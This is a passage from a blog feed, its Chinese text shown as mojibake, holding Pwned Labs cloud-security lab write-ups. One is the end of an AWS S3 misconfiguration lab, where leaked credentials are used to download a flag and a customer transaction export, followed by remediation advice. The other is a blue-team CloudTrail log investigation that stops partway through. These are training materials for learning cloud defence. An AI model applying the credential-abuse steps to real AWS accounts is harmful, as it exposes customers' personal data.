å¯†é’¥å†æ¬¡ææƒ</h3><p>æŸ¥çœ‹<code>test-export.xml</code> æ–‡ä»¶ï¼Œæˆ‘ä»¬å‘ç°äº†æ–°çš„ AWS å‡­è¯ã€‚</p><p><img src="/image/image_RDEz00s8CY.png"></p><p>æˆ‘ä»¬ä½¿ç”¨æ–°çš„å‡­è¯é…ç½® AWS CLIï¼Œç°åœ¨æˆ‘ä»¬æ˜¯ <code>it-admin</code> ç”¨æˆ·äº†ã€‚</p><p><img src="/image/image_u5Ukgxr7W8.png"></p><h3 id="6-7-æˆåŠŸè·å–-Flag-å’Œæ•æ„Ÿä¿¡æ¯"><a href="#6-7-æˆåŠŸè·å–-Flag-å’Œæ•æ„Ÿä¿¡æ¯" class="headerlink" title="6.7 æˆåŠŸè·å– Flag å’Œæ•æ„Ÿä¿¡æ¯"></a>6.7 æˆåŠŸè·å– Flag å’Œæ•æ„Ÿä¿¡æ¯</h3><p>æˆ‘ä»¬éœ€è¦åšçš„ç¬¬ä¸€ä»¶äº‹æƒ…ä¾¿æ˜¯ä¸‹è½½ <code>flag.txt</code> æ–‡ä»¶ï¼Œè·å– flagã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">cp</span> s3://dev.huge-logistics.com/admin/flag.txt .<br></code></pre></td></tr></table></figure><p><img src="/image/image_oJymloxgwo.png"></p><p>æ­¤å¤–ï¼Œç®¡ç†å‘˜è´¦æˆ·<code>it-admin</code>è¿˜èƒ½è®¿é—®ç®¡ç†å‘˜æ–‡ä»¶å¤¹ï¼Œé‡Œé¢ç«Ÿç„¶æœ‰ç”¨æˆ·ä¿¡ç”¨å¡å·å’Œå…¶ä»– PIIï¼ˆä¸ªäººèº«ä»½ä¿¡æ¯ï¼‰çš„æ˜æ–‡ä¿¡æ¯ï¼äºæ˜¯è¯¥ç½‘ç«™è¢«æ”»é™·äº†ï¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">cp</span> s3://dev.huge-logistics.com/admin/website_transactions_export.csv .<br></code></pre></td></tr></table></figure><p><img src="/image/image_GGGxLwDzGG.png"></p><h2 id="0x07-æ€»ç»“"><a href="#0x07-æ€»ç»“" class="headerlink" title="0x07 æ€»ç»“"></a>0x07 æ€»ç»“</h2><p>è¯¥æ•°æ®æ³„éœ²çš„æ ¹æœ¬åŸå› æ˜¯å­˜å‚¨æ¡¶çš„é”™è¯¯é…ç½®å’Œå­˜å‚¨æ•æ„Ÿæ–‡ä»¶çš„ç®¡ç†å¤±è¯¯ã€‚ä¸ºäº†é¿å…ç±»ä¼¼æƒ…å†µå‘ç”Ÿï¼Œåº”åŠ å¼ºå­˜å‚¨æ¡¶çš„æƒé™ç®¡ç†ã€é¿å…ç¡¬ç¼–ç å‡­è¯ã€æé«˜æ•æ„Ÿæ•°æ®çš„ä¿æŠ¤çº§åˆ«ï¼Œé‡‡ç”¨æ›´å®‰å…¨çš„æ–‡ä»¶å…±äº«å’ŒåŠ å¯†æ–¹æ³•ã€‚</p><ol><li>S3 å­˜å‚¨æ¡¶ä½¿ç”¨ä¸å½“<ul><li>é—®é¢˜ï¼šS3 å­˜å‚¨æ¡¶è¢«ç”¨äºæ‰˜ç®¡é™æ€ç½‘ç«™æ–‡ä»¶å’Œå­˜å‚¨æ•æ„Ÿæ–‡ä»¶ã€‚</li><li>å»ºè®®ï¼šå­˜å‚¨æ¡¶åº”åˆ†å¼€ä½¿ç”¨ã€‚æ‰˜ç®¡é™æ€ç½‘ç«™æ–‡ä»¶çš„å­˜å‚¨æ¡¶ä¸åº”å­˜å‚¨æ•æ„Ÿæ–‡ä»¶ï¼Œåº”ä¸ºæ•æ„Ÿæ–‡ä»¶ä½¿ç”¨ç‹¬ç«‹å­˜å‚¨æ¡¶ã€‚</li></ul></li><li><code>shared</code>ç›®å½•çš„æƒé™è®¾ç½®é—®é¢˜<ul><li>é—®é¢˜ï¼š<code>shared</code>ç›®å½•è®¾ç½®ä¸ºå…¨ç½‘å¯è¯»ï¼Œå¯èƒ½æ˜¯ä¸ºäº†ä¸å¤–éƒ¨æ‰¿åŒ…å•†æˆ–é¡¾é—®å…±äº«è¿ç§»è„šæœ¬ã€‚</li><li>é£é™©ï¼šå³ä½¿æ˜¯çŸ­æ—¶é—´å†…å…±äº«æ•æ„Ÿæ–‡ä»¶ï¼Œä¹Ÿå¯èƒ½å¸¦æ¥å·¨å¤§é£é™©ï¼Œå› ä¸ºè„šæœ¬å’Œæœºå™¨äººèƒ½å¤Ÿè‡ªåŠ¨æ£€æµ‹å˜åŒ–å¹¶ä¸‹è½½æ–‡ä»¶ã€‚</li><li>å»ºè®®ï¼šé€šè¿‡æ›´å®‰å…¨çš„æ–¹å¼å…±äº«æ–‡ä»¶ï¼Œå¹¶ç”¨å¼ºéšæœºå¯†ç åŠ å¯†å‹ç¼©æ–‡ä»¶ï¼Œç¡®ä¿æ–‡ä»¶çš„å®‰å…¨ã€‚</li></ul></li><li>AWS å‡­è¯ç¡¬ç¼–ç é—®é¢˜<ul><li>é—®é¢˜ï¼šAWS å‡­è¯è¢«ç¡¬ç¼–ç åˆ° PowerShell è„šæœ¬ä¸­ã€‚</li><li>é£é™©ï¼šä»»ä½•äººéƒ½å¯ä»¥è®¿é—®è¿™äº›å‡­è¯ï¼Œä»è€Œè¿›å…¥äº‘ç¯å¢ƒï¼Œå¯¼è‡´è´¦æˆ·è¢«æ¶æ„ä½¿ç”¨ã€‚</li><li>å»ºè®®ï¼šé¿å…åœ¨ä»£ç ä¸­ç¡¬ç¼–ç å‡­è¯ï¼Œæ”¹ç”¨æ›´å®‰å…¨çš„å‡­è¯ç®¡ç†æ–¹å¼ï¼Œä¾‹å¦‚ IAM è§’è‰²æˆ–ç¯å¢ƒå˜é‡ã€‚</li></ul></li><li>PAM ç³»ç»Ÿå¯¼å‡ºæ–‡ä»¶æš´éœ²é—®é¢˜<ul><li>é—®é¢˜ï¼šä¸€ä¸ªä»å®‰å…¨ PAM ç³»ç»Ÿå¯¼å‡ºçš„ XML æ–‡ä»¶è¢«å­˜å‚¨åœ¨ S3 å­˜å‚¨æ¡¶ä¸­ï¼Œå¹¶ä¸”å¯ä»¥è¢«ç¬¬ä¸€ä¸ªè¢«æ”»å‡»çš„ IAM è´¦æˆ·è®¿é—®ã€‚</li><li>é£é™©ï¼šè¯¥æ–‡ä»¶åŒ…å«é«˜æƒé™å‡­è¯ï¼Œæ³„éœ²äº† Huge Logistics æœ¬åœ°å’Œäº‘åŸºç¡€è®¾æ–½çš„æ•æ„Ÿä¿¡æ¯ã€‚</li><li>è¿›ä¸€æ­¥é£é™©ï¼šè¯¥æ–‡ä»¶è¿˜åŒ…å«ç¬¬äºŒä¸ªè¢«æ”»å‡»è´¦æˆ·çš„å‡­è¯ï¼Œè¯¥è´¦æˆ·å…·æœ‰æ¯”ç¬¬ä¸€ä¸ªè´¦æˆ·æ›´å¤šçš„æƒé™ï¼Œå…è®¸è®¿é—®æœªåŠ å¯†çš„å®¢æˆ·æ•°æ®ï¼Œæš´éœ²äº†å®¢æˆ·æœºå¯†ä¿¡æ¯ã€‚</li><li>åæœï¼šå¯èƒ½å¯¼è‡´è´¢åŠ¡æŸå¤±ã€èº«ä»½ç›—çªƒå’Œå…¬å¸å£°èª‰å—æŸã€‚</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>AWS å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Breach in the Cloudï¼šäº‘ç«¯æ•°æ®æ³„éœ²</title>
    <link href="/2025/04/30/%E3%80%90Pwned-Labs%E3%80%91Breach-in-the-Cloud%EF%BC%9A%E4%BA%91%E7%AB%AF%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/"/>
    <url>/2025/04/30/%E3%80%90Pwned-Labs%E3%80%91Breach-in-the-Cloud%EF%BC%9A%E4%BA%91%E7%AB%AF%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-åœºæ™¯ä»‹ç»"><a href="#0x00-åœºæ™¯ä»‹ç»" class="headerlink" title="0x00 åœºæ™¯ä»‹ç»"></a>0x00 åœºæ™¯ä»‹ç»</h2><p>æˆ‘ä»¬æ”¶åˆ°äº†å¯èƒ½å­˜åœ¨å®‰å…¨äº‹ä»¶çš„è­¦æŠ¥ã€‚</p><p>Huge Logistics çš„å®‰å…¨å›¢é˜Ÿå‘ä½ æä¾›äº†ä¸€ä¸ª AWS è´¦æˆ·çš„è®¿é—®å¯†é’¥ï¼Œè¯¥è´¦æˆ·æ›¾å‡ºç°å¼‚å¸¸æ´»åŠ¨ï¼ŒåŒæ—¶è¿˜æä¾›äº†è¯¥æ—¶æ®µçš„ AWS CloudTrail æ—¥å¿—ã€‚</p><p>æˆ‘ä»¬éœ€è¦ä½ åˆ©ç”¨ä¸“ä¸šæŠ€èƒ½ï¼Œé€šè¿‡åˆ†æ CloudTrail æ—¥å¿—ç¡®è®¤æ˜¯å¦å‘ç”Ÿäº†æ•°æ®æ³„éœ²ï¼Œè¯†åˆ«è¢«æ”»ç ´çš„ AWS æœåŠ¡ä»¥åŠæ˜¯å¦æœ‰æ•°æ®è¢«å¤–æ³„ã€‚</p><blockquote><p><strong>ğŸ¯ ç‚¹å‡»ã€é˜…è¯»åŸæ–‡ã€‘ï¼Œç«‹å³è¿›å…¥é¶åœºç¯å¢ƒï¼</strong></p></blockquote><h2 id="0x01-å‰ç½®çŸ¥è¯†"><a href="#0x01-å‰ç½®çŸ¥è¯†" class="headerlink" title="0x01 å‰ç½®çŸ¥è¯†"></a>0x01 å‰ç½®çŸ¥è¯†</h2><ul><li>åŸºç¡€çš„ Linux å‘½ä»¤è¡ŒçŸ¥è¯†</li></ul><h2 id="0x02-å­¦ä¹ ç›®æ ‡"><a href="#0x02-å­¦ä¹ ç›®æ ‡" class="headerlink" title="0x02 å­¦ä¹ ç›®æ ‡"></a>0x02 å­¦ä¹ ç›®æ ‡</h2><ul><li>ç¾åŒ– JSON æ–‡ä»¶ä»¥ä¾¿äºåˆ†æï¼›</li><li>ç†Ÿæ‚‰ AWS CLI çš„ä½¿ç”¨ï¼›</li><li>ç†Ÿæ‚‰ CloudTrail æ—¥å¿—çš„åˆ†ææ–¹æ³•ï¼›</li><li>æšä¸¾ S3 æ¡¶ï¼›</li><li>æ¨¡æ‹Ÿæ”»å‡»è€…çš„è¡Œä¸ºæ¥éªŒè¯å…¥ä¾µè·¯å¾„ã€‚</li></ul><h2 id="0x03-éš¾åº¦ç­‰çº§"><a href="#0x03-éš¾åº¦ç­‰çº§" class="headerlink" title="0x03 éš¾åº¦ç­‰çº§"></a>0x03 éš¾åº¦ç­‰çº§</h2><ul><li>åˆå­¦è€…ï¼ˆBeginnerï¼‰</li></ul><h2 id="0x04-å…³æ³¨é‡ç‚¹"><a href="#0x04-å…³æ³¨é‡ç‚¹" class="headerlink" title="0x04 å…³æ³¨é‡ç‚¹"></a>0x04 å…³æ³¨é‡ç‚¹</h2><ul><li>è“é˜Ÿï¼ˆBlueï¼‰</li></ul><h2 id="0x05-çœŸå®èƒŒæ™¯"><a href="#0x05-çœŸå®èƒŒæ™¯" class="headerlink" title="0x05 çœŸå®èƒŒæ™¯"></a>0x05 çœŸå®èƒŒæ™¯</h2><p>åˆ†æ AWS CloudTrail æ—¥å¿—æ˜¯æ£€æµ‹ AWS è´¦æˆ·ä¸­å¯ç–‘æ´»åŠ¨çš„æ ‡å‡†åšæ³•ï¼Œè€Œ S3 æ¡¶åˆ™å› å…¶å¯èƒ½åŒ…å«æœ‰ä»·å€¼çš„æ•°æ®è€Œå¸¸æˆä¸ºæ”»å‡»è€…çš„ç›®æ ‡ã€‚</p><h2 id="0x06-è§£é¢˜æ€è·¯"><a href="#0x06-è§£é¢˜æ€è·¯" class="headerlink" title="0x06 è§£é¢˜æ€è·¯"></a>0x06 è§£é¢˜æ€è·¯</h2><h3 id="6-1-å‡†å¤‡é˜¶æ®µ"><a href="#6-1-å‡†å¤‡é˜¶æ®µ" class="headerlink" title="6.1 å‡†å¤‡é˜¶æ®µ"></a>6.1 å‡†å¤‡é˜¶æ®µ</h3><h4 id="6-1-1-å·¥å…·ç¯å¢ƒå‡†å¤‡"><a href="#6-1-1-å·¥å…·ç¯å¢ƒå‡†å¤‡" class="headerlink" title="6.1.1 å·¥å…·ç¯å¢ƒå‡†å¤‡"></a>6.1.1 å·¥å…·ç¯å¢ƒå‡†å¤‡</h4><p>å®éªŒè¿‡ç¨‹å‡åœ¨ Mac OS ä¸­è¿›è¡Œçš„ï¼Œéœ€è¦æå‰ä¸‹è½½å¹¶å‡†å¤‡ä»¥ä¸‹å·¥å…·ï¼Œå…¶å®ƒå¹³å°åŒç†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">brew install unzip<br>brew install jq<br>brew install awscli<br></code></pre></td></tr></table></figure><h4 id="6-1-2-è§£å‹åˆ†ææ–‡ä»¶"><a href="#6-1-2-è§£å‹åˆ†ææ–‡ä»¶" class="headerlink" title="6.1.2 è§£å‹åˆ†ææ–‡ä»¶"></a>6.1.2 è§£å‹åˆ†ææ–‡ä»¶</h4><p>ä½¿ç”¨ <code>unzip</code> è§£å‹ CloudTrail æ—¥å¿—åŒ…ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip INCIDENT-3252.zip -d INCIDENT-3252<br><span class="hljs-built_in">cd</span> INCIDENT-3252<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_lxyU6zWq04.png"></p><h4 id="6-1-2-æ ¼å¼åŒ–æ—¥å¿—"><a href="#6-1-2-æ ¼å¼åŒ–æ—¥å¿—" class="headerlink" title="6.1.2 æ ¼å¼åŒ–æ—¥å¿—"></a>6.1.2 æ ¼å¼åŒ–æ—¥å¿—</h4><p>å¦‚æœæˆ‘ä»¬ä½¿ç”¨ Nano æˆ– Vim ç­‰æ–‡æœ¬ç¼–è¾‘å™¨æ¥æ‰“å¼€è¿™äº› JSON æ–‡ä»¶ï¼Œä¼šå‘ç°è¿™äº›æ–‡ä»¶å¹¶æœªè¿›è¡Œè¿‡æ ¼å¼åŒ–ï¼Œå› æ­¤ä¼šå¾ˆéš¾è¿›è¡Œé˜…è¯»ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹<code>jq</code> å‘½ä»¤è¿›è¡Œæ ¼å¼åŒ–ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> *.json; <span class="hljs-keyword">do</span> jq . <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> &gt; <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>.tmp&quot;</span> &amp;&amp; <span class="hljs-built_in">mv</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>.tmp&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><img src="/image/image_85pIl9o-Tl.png"></p><h3 id="6-2-åˆæ­¥è°ƒæŸ¥"><a href="#6-2-åˆæ­¥è°ƒæŸ¥" class="headerlink" title="6.2 åˆæ­¥è°ƒæŸ¥"></a>6.2 åˆæ­¥è°ƒæŸ¥</h3><h4 id="6-2-1-æŸ¥æ‰¾-IAM-ç”¨æˆ·"><a href="#6-2-1-æŸ¥æ‰¾-IAM-ç”¨æˆ·" class="headerlink" title="6.2.1 æŸ¥æ‰¾ IAM ç”¨æˆ·"></a>6.2.1 æŸ¥æ‰¾ IAM ç”¨æˆ·</h4><p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹æ—¥å¿—ä¸­è®°å½•äº†å“ªäº› AWS ä¸»ä½“ï¼Œå³å“ªäº› IAM ç”¨æˆ·å’Œè§’è‰²é‡‡å–äº†è¡ŒåŠ¨ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å‘ç°å­˜åœ¨å¯ç–‘ç”¨æˆ·<code>temp-user</code>ï¼Œå› ä¸ºè¯¥ç”¨æˆ·åä¸ç¬¦åˆå·²åˆ›å»ºè´¦æˆ·çš„å†…éƒ¨å‘½åè§„èŒƒã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -r userName | <span class="hljs-built_in">sort</span> -u<br></code></pre></td></tr></table></figure><ul><li><code>grep -r</code>ï¼šé€’å½’æœç´¢ï¼Œå³ä¸ä»…æœç´¢å½“å‰ç›®å½•ï¼Œè¿˜ä¼šæ·±å…¥æ‰€æœ‰å­ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œå¹¶å¯¹æ¯ä¸ªæ–‡ä»¶è¿›è¡Œé€è¡Œæœç´¢ï¼›</li><li><code>sort -u</code>ï¼šå¯¹è¾“å‡ºå†…å®¹è¿›è¡Œæ’åºå¹¶å»é‡ã€‚</li></ul><p><img src="/image/image_xeoHHh0QNj.png"></p><blockquote><p>å¯¹ IAM ç”¨æˆ·å’Œè§’è‰²ä¸äº†è§£çš„ï¼Œå¯ä»¥å…ˆçœ‹çœ‹æˆ‘ä»¬çš„è¿™ç¯‡æ–‡ç« <a href="../../20/%E6%97%A0%E7%97%9B%E5%AD%A6%E4%B9%A0-AWS-%E7%9A%84%E8%BA%AB%E4%BB%BD%E4%B8%8E%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%EF%BC%88IAM%EF%BC%89/index.html">æ— ç—›å­¦ä¹  AWS çš„èº«ä»½ä¸è®¿é—®ç®¡ç†ï¼ˆIAMï¼‰</a></p></blockquote><h4 id="6-2-2-è¯†åˆ«æ—¥å¿—æ—¶é—´çº¿"><a href="#6-2-2-è¯†åˆ«æ—¥å¿—æ—¶é—´çº¿" class="headerlink" title="6.2.2 è¯†åˆ«æ—¥å¿—æ—¶é—´çº¿"></a>6.2.2 è¯†åˆ«æ—¥å¿—æ—¶é—´çº¿</h4><p>CloudTrail å¯¹ä¼ é€åˆ° Amazon S3 å­˜å‚¨æ¡¶çš„æ—¥å¿—æ–‡ä»¶å¯¹è±¡ä½¿ç”¨ä»¥ä¸‹æ–‡ä»¶åæ ¼å¼ã€‚<code>YYYY</code>ã€<code>MM</code>ã€<code>DD</code>ã€<code>HH</code>å’Œ<code>mm</code> åˆ†åˆ«æ˜¯æ—¥å¿—æ–‡ä»¶ä¼ é€æ—¶çš„å¹´ã€æœˆã€æ—¥ã€æ—¶ã€åˆ†ã€‚å°æ—¶é‡‡ç”¨ 24 å°æ—¶åˆ¶ã€‚<code>Z</code>è¡¨ç¤ºæ—¶é—´ä¸º UTC æ—¶é—´ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">AccountID_CloudTrail_RegionName_YYYYMMDDTHHmmZ_UniqueString.FileNameFormat<br></code></pre></td></tr></table></figure><p><img src="/image/image_6PDBojuiVL.png"></p><blockquote><p>è‹¥æƒ³äº†è§£ CloudTrail æ—¥å¿—æ–‡ä»¶çš„å‘½åè§„èŒƒï¼Œå¯ä»¥æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ <a href="https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-examples.html" title="ã€ŠCloudTrail log file name formatã€‹">ã€ŠCloudTrail log file name formatã€‹</a></p></blockquote><h3 id="6-3-æ”»å‡»è€…æ´»åŠ¨è¿½è¸ª"><a href="#6-3-æ”»å‡»è€…æ´»åŠ¨è¿½è¸ª" class="headerlink" title="6.3 æ”»å‡»è€…æ´»åŠ¨è¿½è¸ª"></a>6.3 æ”»å‡»è€…æ´»åŠ¨è¿½è¸ª</h3><h4 id="6-3-1-ä¾¦æŸ¥é˜¶æ®µ"><a href="#6-3-1-ä¾¦æŸ¥é˜¶æ®µ" class="headerlink" title="6.3.1 ä¾¦æŸ¥é˜¶æ®µ"></a>6.3.1 ä¾¦æŸ¥é˜¶æ®µ</h4><p>æœ€æ—©çš„æ—¥å¿—æ–‡ä»¶ä¸ºå¸¦æœ‰å…³é”®è¯ <code>T2035Z</code>çš„æ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬æœç´¢å¸¦æœ‰ <code>temp-user</code> å…³é”®å­—å¹¶è¾“å‡ºå®ƒçš„å 10 è¡Œæ—¥å¿—ï¼Œæ¥ç€æˆ‘ä»¬å‘ç°ä¸€ä¸ªåä¸º <code>temp-user</code> çš„ç”¨æˆ·ï¼ˆæ¥è‡ª AWS è´¦æˆ·<code>107513503799</code>ï¼‰åœ¨ 2023 å¹´ 8 æœˆ 26 æ—¥ 20:29:37 UTC è¿è¡Œäº† CLI å‘½ä»¤<code>aws sts get-caller-identity</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -h -A 10 temp-user 107513503799_CloudTrail_us-east-1_20230826T2035Z_PjmwM7E4hZ6897Aq.json<br></code></pre></td></tr></table></figure><ul><li><code>-h</code>ï¼šä¸åœ¨è¾“å‡ºä¸­æ˜¾ç¤ºæ–‡ä»¶åï¼ˆé€‚ç”¨äºå¤šä¸ªæ–‡ä»¶æ—¶ï¼‰ï¼›</li><li><code>-A 10</code>ï¼šåœ¨åŒ¹é…è¡Œä¹‹åé¢å¤–è¾“å‡º 10 è¡Œï¼ˆA &#x3D; Afterï¼‰ã€‚</li></ul><p><img src="/image/image_BR_Iddx8Wv.png"></p><p>åœ¨ AWS ä¸­ï¼Œ<code>GetCallerIdentity</code>æ˜¯å®‰å…¨ä»¤ç‰ŒæœåŠ¡ï¼ˆSTSï¼‰çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå…è®¸ç”¨æˆ·è·å–å½“å‰ä½¿ç”¨å…¶å‡­è¯å‘èµ· API è¯·æ±‚çš„ IAM èº«ä»½çš„è¯¦ç»†ä¿¡æ¯ã€‚</p><p>è¿™ä¸ªå‘½ä»¤æœ‰ç‚¹ç±»ä¼¼äº Windows æˆ– Linux ä¸­çš„<code>whoami</code>å‘½ä»¤ã€‚è¯¥å‘½ä»¤ä¼šè¿”å›è°ƒç”¨è€…çš„å…¨å±€å”¯ä¸€ ARNï¼Œå¦‚æœæ˜¯ä»¥è§’è‰²èº«ä»½æ“ä½œï¼Œè¿˜ä¼šè¿”å›è¢«å‡è®¾çš„ IAM è§’è‰² ARNã€‚</p><p>è™½ç„¶è¿™æ˜¯ä¸€ä¸ªéå¸¸å¸¸ç”¨çš„å‘½ä»¤ï¼Œä½†å®ƒä¹Ÿå¸¸è¢«æ”»å‡»è€…ç”¨äºè¯†åˆ«æ˜“å—æ”»å‡»çš„å‡­è¯æ‰€å…³è”çš„ IAM ç”¨æˆ·æˆ–è§’è‰²ï¼Œä»è€Œå¸®åŠ©ä»–ä»¬äº†è§£å½“å‰æƒé™èŒƒå›´ä¸ç¯å¢ƒï¼ˆå³è·å–æ€åŠ¿æ„ŸçŸ¥ï¼‰ã€‚</p><p>è¯¥è¯·æ±‚æºè‡ª IP åœ°å€<code>84.32.71.19</code>ã€‚æ£€æŸ¥ IP åå‘ç°ï¼Œè¯¥è¯·æ±‚æºè‡ª Cherry Servers æ‹¥æœ‰çš„ IP åœ°å€ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl ipinfo.io/84.32.71.19<br></code></pre></td></tr></table></figure><p><img src="/image/image_KcZuHNqJgC.png"></p><p>Cheery Servers æ˜¯ä¸€å®¶æŒ‰éœ€äº‘èµ„æºæä¾›å•†ï¼ŒHuge Logistics å¹¶æœªä½¿ç”¨è¯¥æœåŠ¡ï¼Œå› æ­¤è¿™å¯èƒ½æ˜¯ä¸€ä¸ªæ½œåœ¨çš„å…¥ä¾µæŒ‡æ ‡ï¼ˆIoCï¼ŒIndicator of Compromiseï¼‰ã€‚è®©æˆ‘ä»¬è¿›ä¸€æ­¥æ·±å…¥è°ƒæŸ¥ã€‚</p><p><img src="/image/image_d7up57R7M1.png"></p><h4 id="6-3-2-æƒé™æšä¸¾é˜¶æ®µ"><a href="#6-3-2-æƒé™æšä¸¾é˜¶æ®µ" class="headerlink" title="6.3.2 æƒé™æšä¸¾é˜¶æ®µ"></a>6.3.2 æƒé™æšä¸¾é˜¶æ®µ</h4><p>æ¥ç€ï¼Œæˆ‘ä»¬ç»§ç»­åˆ†æä¸‹ä¸€ä¸ªæ–‡ä»¶ï¼Œå³å¸¦æœ‰å…³é”®å­— <code>T2040Z</code> çš„æ–‡ä»¶ã€‚æˆ‘ä»¬å‘ç°ç”¨æˆ·å <code>temp-user</code> å°è¯•åˆ—å‡ºå­˜å‚¨æ¡¶<code>emergency-data-recovery</code> çš„å†…å®¹ï¼Œä½†å¤±è´¥äº†ã€‚</p><p><img src="/image/image_uuMfL-GACn.png"></p><p>ç»§ç»­æŸ¥çœ‹ä¸‹ä¸€ä¸ªæ–‡ä»¶<code>T2050Z</code>ï¼Œæˆ‘ä»¬ä¼šå‘ç°å¾ˆå¤šé”™è¯¯ã€‚å¯èƒ½æ˜¯å› ä¸º <code>temp-user</code> å‘å…¶å®ƒ AWS æœåŠ¡å‘èµ·äº†å¤§é‡çš„è¯·æ±‚ã€‚</p><p><img src="/image/image_1N-FPv7zRi.png"></p><p>å°½ç®¡å™ªå£°å¾ˆå¤§ï¼Œä½†æ˜¯æ”»å‡»è€…ä¹Ÿæœ‰å¯èƒ½ä¼šé€šè¿‡æš´åŠ›ç ´è§£çš„æ–¹å¼æ¥æšä¸¾æˆäºˆå…¶ IAM ç”¨æˆ·æˆ–è§’è‰²çš„æƒé™ã€‚ä¾‹å¦‚ä¸‹ä¸€ä¸ªæ–‡ä»¶<code>T2055Z</code>ä¸­åŒ…å«äº† 450 æ¡è®¿é—®è¢«æ‹’ç»çš„ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep errorMessage 107513503799_CloudTrail_us-east-1_20230826T2050Z_iUtQqYPskB20yZqT.json | <span class="hljs-built_in">wc</span> -l<br>grep errorMessage 107513503799_CloudTrail_us-east-1_20230826T2055Z_W0F5uypAbGttUgSn.json | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><p><img src="/image/image_wgQ8t9HqDJ.png"></p><blockquote><p>ç›®å‰æœ‰å¤šç§å¼€æºå·¥å…·å¯ç”¨äºæš´åŠ›ç ´è§£ IAM çš„æƒé™ï¼Œä¾‹å¦‚ <a href="https://github.com/shabarkin/aws-enumerator" title="aws-enumerator">aws-enumerator</a> å’Œ <a href="https://github.com/RhinoSecurityLabs/pacu" title="pacu">pacu</a></p></blockquote><h4 id="6-3-3-æƒé™æå‡é˜¶æ®µ"><a href="#6-3-3-æƒé™æå‡é˜¶æ®µ" class="headerlink" title="6.3.3 æƒé™æå‡é˜¶æ®µ"></a>6.3.3 æƒé™æå‡é˜¶æ®µ</h4><p>ç»§ç»­æŸ¥çœ‹ä¸‹ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶<code>T2100Z</code>å¹¶æŸ¥æ‰¾ <code>temp-user</code> ç”¨æˆ·çš„æ“ä½œã€‚æˆ‘ä»¬å‘ç°ä»–æˆåŠŸçš„æ‰®æ¼”äº†ä¸€ä¸ªåä¸º<code>AdminRole</code>çš„è§’è‰²ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -A 20 temp-user 107513503799_CloudTrail_us-east-1_20230826T2100Z_APB7fBUnHmiWjHtg.json<br></code></pre></td></tr></table></figure><p><img src="/image/image_viu1K7NMO4.png"></p><p>å†çœ‹ä¸‹ä¸€ä¸ªæ—¥å¿—æ–‡ä»¶<code>T2105Z</code>ï¼Œå‘ç°æ”»å‡»è€…å†æ¬¡é€šè¿‡å‘½ä»¤<code>aws sts get-caller-identity</code> æ¥éªŒè¯èº«ä»½ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -A 20 AdminRole 107513503799_CloudTrail_us-east-1_20230826T2105Z_fpp78PgremAcrW5c.json<br></code></pre></td></tr></table></figure><p><img src="/image/image_-MnMMk1EeE.png"></p><h4 id="6-3-4-ç›®æ ‡è¾¾æˆé˜¶æ®µ"><a href="#6-3-4-ç›®æ ‡è¾¾æˆé˜¶æ®µ" class="headerlink" title="6.3.4 ç›®æ ‡è¾¾æˆé˜¶æ®µ"></a>6.3.4 ç›®æ 